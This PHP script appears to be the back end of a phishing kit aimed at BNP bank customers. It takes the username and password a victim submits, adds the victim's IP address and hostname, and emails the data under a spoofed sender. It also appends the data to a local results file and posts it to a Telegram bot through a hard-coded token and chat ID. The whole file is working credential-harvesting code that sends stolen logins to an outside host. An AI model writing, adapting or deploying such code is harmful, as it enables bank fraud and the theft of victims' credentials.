<?php	

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------------------------------\n";

$bilsmg .= " USR:           : ".$_POST['ch1']."\n";
$bilsmg .= " PWD:           : ".$_POST['idpassword']."\n";
$bilsmg .= " isp|: $ip | $hostname\n";
$bilsmg .= "------------------------------------\n";

$message .= "---".$_POST['ZAG']."---\n";
$message .= " USR|: ".$_POST['ch1']."\n";
$message .= " PWD|: ".$_POST['idpassword']."\n";
$message .= " isp|: $ip | $hostname\n";





$bilsnd = "@gmail.com";
$bilsub = "Bnp ID | $ip";
$bilhead = "From: Bnp ID <info2@mail.ziggo.nl>";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


$Txt_Rezlt = fopen('rzlt.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

mail($to, $subject, $message, $headers);
$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-662491150&text=" . urlencode($message)."" );





?>
